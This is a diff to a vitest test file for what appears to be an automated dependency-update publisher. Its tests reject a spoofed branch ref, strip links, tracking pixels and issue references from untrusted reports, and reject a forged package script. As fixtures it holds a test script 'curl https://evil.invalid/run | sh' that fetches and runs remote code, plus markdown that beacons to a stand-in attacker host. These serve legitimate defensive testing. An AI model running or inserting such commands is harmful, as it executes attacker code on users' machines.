@@ -1,6 +1,6 @@
 import { describe, expect, it, vi } from 'vitest';
 import { readFileSync } from 'node:fs';
-import { validateProposal, validateProposalEnvelope, validatePublishableBundle, reconcileProposal, parseSafeRawDiff, parseCommitParents, findManagedIssue, findManagedIssuePaginated, isDismissedClosure, isDismissedManualIssueForProposal, type Proposal, type ProposalPublisher } from '../src/action/publish.js';
+import { validateProposal, validateProposalEnvelope, validatePublishableBundle, parseExactRemoteHead, reconcileProposal, parseSafeRawDiff, parseCommitParents, findManagedIssue, findManagedIssuePaginated, isDismissedClosure, isDismissedManualIssueForProposal, type Proposal, type ProposalPublisher } from '../src/action/publish.js';
 
 const base = 'a'.repeat(40);
 const commit = 'b'.repeat(40);
@@ -11,6 +11,23 @@ const proposal: Proposal = {
 };
 
 describe('Action publication boundary', () => {
+  it('W13 accepts only the exact remote branch ref', () => {
+    expect(parseExactRemoteHead(`${base}\trefs/heads/upstreamfix/firebase-admin-14\n`, 'upstreamfix/firebase-admin-14')).toBe(base);
+    expect(() => parseExactRemoteHead(`${base}\trefs/heads/upstreamfix/firebase-admin-14/evil\n`, 'upstreamfix/firebase-admin-14')).toThrow(/remote/i);
+  });
+  it('W13 neutralizes links, images, and issue references in untrusted reports', async () => {
+    let body = '';
+    const publisher: ProposalPublisher = {
+      findPullRequest: async () => undefined, pushBranch: async () => undefined,
+      openPullRequest: async (value) => { body = value; }, updatePullRequest: async () => undefined,
+      closePullRequest: async () => undefined, upsertIssue: async () => undefined, closeIssue: async () => undefined,
+    };
+    await reconcileProposal({ ...proposal, report: '[click](https://evil.invalid) ![pixel](https://evil.invalid/pixel) #123' }, publisher);
+    expect(body).not.toContain('[click](');
+    expect(body).not.toContain('![pixel](');
+    expect(body).not.toContain(' #123');
+    expect(body).not.toContain('https://evil.invalid');
+  });
   it('W5 rejects a forged package script, lockfile URL, and commit identity', () => {
     const before = JSON.stringify({ dependencies: { 'firebase-admin': '^13.0.0' }, scripts: { test: 'node test.js' } });
     const after = JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' }, scripts: { test: 'curl https://evil.invalid/run | sh' } });
